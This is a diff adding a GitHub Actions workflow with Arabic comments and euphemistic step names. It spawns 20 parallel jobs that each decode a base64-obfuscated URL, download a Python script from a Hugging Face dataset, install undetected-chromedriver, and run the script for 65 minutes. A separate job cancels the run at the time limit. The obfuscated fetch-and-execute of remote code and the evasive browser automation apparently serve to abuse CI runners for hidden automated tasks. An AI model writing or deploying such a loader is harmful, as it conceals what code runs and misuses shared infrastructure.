@@ -1,1 +1,107 @@
+name: Linux Staged Task Wing
 
+on:
+  # استقبال أمر التشغيل الخارجي عبر التوكن بالكلمة المفتاحية: start
+  workflow_dispatch:
+
+concurrency:
+  group: staged-wing-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # مأمور الإيقاف القسري: يُنهي الـ workflow بأكمله عند علامة 65 دقيقة
+  # =================================================================
+  coercive-halt-bailiff:
+    name: "Coercive Halt Bailiff"
+    runs-on: ubuntu-latest
+    timeout-minutes: 70
+    steps:
+      - name: Execute Compulsory Halt Order
+        run: |
+          echo "[BAILIFF] Coercive halt bailiff on watch. Compulsory cessation armed at the 65-minute beacon."
+          echo "[BAILIFF] Examining workflow identifier: ${{ github.run_id }}"
+          
+          # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
+          sleep 3900
+          
+          echo "[BAILIFF] Beacon detected! Executing compulsory halt order..."
+          
+          # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[BAILIFF] Compulsory halt order executed. Every running and stalled unit will be halted."
+
+  # =================================================================
+  # المهمة الرئيسية: تجهيز وإطلاق وحدات الجناح
+  # =================================================================
+  stage-wing:
+    name: "WingUnit-${{ matrix.unit_ref }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 65
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_ref: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      # ✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷
+      # ⇶ المقطع (أ): بسط الأرضية التأسيسية
+      # ✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷
+      - name: Spread Foundational Floor
+        run: |
+          echo "[SPREAD] Spreading foundational floor for WingUnit-${{ matrix.unit_ref }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷
+      # ⇶ المقطع (ب): احتجاز الوثيقة التنفيذية
+      # ✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷
+      - name: Detain Execution Paperwork
+        run: |
+          echo "[DETAIN] Detaining app_task.py from assigned repository bin..."
+          REPOSITORY_BIN=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$REPOSITORY_BIN" -o app_task.py
+          echo "[DETAIN] Execution paperwork detained successfully."
+
+      # ✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷
+      # ⇶ المقطع (ج): إلحاق المكتبات المرافقة
+      # ✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷
+      - name: Append Companion Libraries
+        run: |
+          echo "[APPEND] Appending companion libraries..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # ✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷
+      # ⇶ المقطع (د): التنفيذ المقيد بالمدة (65 دقيقة)
+      # ✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷✷
+      - name: Conduct Riveted Operation
+        run: |
+          echo ">> Staging WingUnit-${{ matrix.unit_ref }} operation..."
+          
+          # إطلاق العملية في الخلفية
+          python3 app_task.py &
+          WING_PID=$!
+          
+          echo ">> Riveted operation engaged. Span: 65 minutes (3900s)."
+          
+          # الانتظار حتى استنفاد المدة المحددة
+          sleep 3900
+          
+          # التحقق من حالة العملية وإنهاؤها عند الضرورة
+          if kill -0 $WING_PID 2>/dev/null; then
+            echo ">> Riveted window elapsed! Retiring operation..."
+            kill -9 $WING_PID
+            echo ">> Operation retired by rivet keeper."
+          else
+            echo ">> Operation closed within riveted window."
+          fi
